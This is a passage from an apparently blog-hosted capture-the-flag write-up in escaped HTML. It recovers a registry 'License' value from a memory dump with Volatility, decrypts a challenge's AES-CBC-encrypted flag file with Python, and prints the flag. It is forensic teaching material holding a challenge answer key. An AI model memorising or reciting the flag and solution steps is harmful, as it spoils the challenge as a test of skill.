&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 vol.py -f &lt;span class="s2">&amp;#34;~/WRK01-20240512-195957.dmp&amp;#34;&lt;/span> windows.registry.printkey.PrintKey --offset 0xbb0e4e9bf000 --key &lt;span class="s2">&amp;#34;Software\\Setec&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last Write Time Hive Offset Type Key Name Data Volatile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-05-12 19:59:24.000000 0xbb0e4e9bf000 REG_SZ &lt;span class="se">\?&lt;/span>?&lt;span class="se">\C&lt;/span>:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\C&lt;/span>SCPT&lt;span class="se">\n&lt;/span>tuser.dat&lt;span class="se">\S&lt;/span>oftware&lt;span class="se">\S&lt;/span>etec License &lt;span class="s2">&amp;#34;2c05f9a5e7e0cef634d0319df56a4eee&amp;#34;&lt;/span> False
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And there is the &amp;ldquo;License&amp;rdquo; key, with the value &lt;code>2c05f9a5e7e0cef634d0319df56a4eee&lt;/code>.&lt;/p>
&lt;p>Regarding the decipher of the key, the following steps can be taken:&lt;/p>
&lt;ul>
&lt;li>The key to the AES cipher can be obtained by doing the exact same operations done in the &lt;code>cscpt.py&lt;/code> script.&lt;/li>
&lt;li>The encrypted content inside &lt;code>flag.enc&lt;/code> must be Base64 decoded and then separated into two: the IV (first 16 bytes) and the ciphertext (the rest):
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">encrypted_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">enc_file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encrypted_data&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ciphertext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encrypted_data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>The encrypted data must be deciphered and unpadded using the same AES CBC routine:
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">cipher&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Cipher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">algorithms&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">AES&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var02&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">modes&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CBC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">iv&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">backend&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">default_backend&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decryptor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cipher&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decryptor&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">padded_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decryptor&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">decryptor&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">finalize&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">unpadder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">padding&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PKCS7&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">unpadder&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypted_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unpadder&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">padded_data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">unpadder&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">finalize&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Instead of implementing the decipher script all by yourself, you could just copy the &lt;code>cscpt.py&lt;/code> code to ChatGPT and say &amp;ldquo;This script ciphers &lt;code>C:\CSCPT\flag.txt&lt;/code> and writes the ciphertext to &lt;code>C:\CSCPT\flag.enc&lt;/code>. Give me the code that does the opposite (deciphers &lt;code>C:\CSCPT\flag.enc&lt;/code> and returns &lt;code>C:\CSCPT\flag.txt&lt;/code>)&amp;rdquo;, and it would be much faster.&lt;/li>
&lt;/ul>
&lt;p>The &lt;code>decrypted_data&lt;/code> variable holds the flag:
&lt;code>CSCPT{09498a54273576f7af78c95110c6c0310f7c54041270b25a52f054ed4e6ea394}&lt;/code>&lt;/p></description></item></channel></rss>